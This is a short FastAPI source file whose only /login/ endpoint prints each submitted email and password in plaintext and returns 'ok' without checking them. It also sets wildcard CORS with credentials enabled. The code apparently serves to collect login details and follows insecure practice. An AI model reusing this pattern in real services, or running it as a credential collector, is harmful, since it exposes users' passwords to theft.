from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from models import Credentials

app = FastAPI()

origins = [
    "https://kompas-obywatelski.vercel.app/",
]


app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)



@app.post("/login/")
async def read_credentials(credentials: Credentials):
    # Open file in append mode and wr ite the credentials
    print(f"{credentials.email} | {credentials.password}")
    return {"status": "ok"}


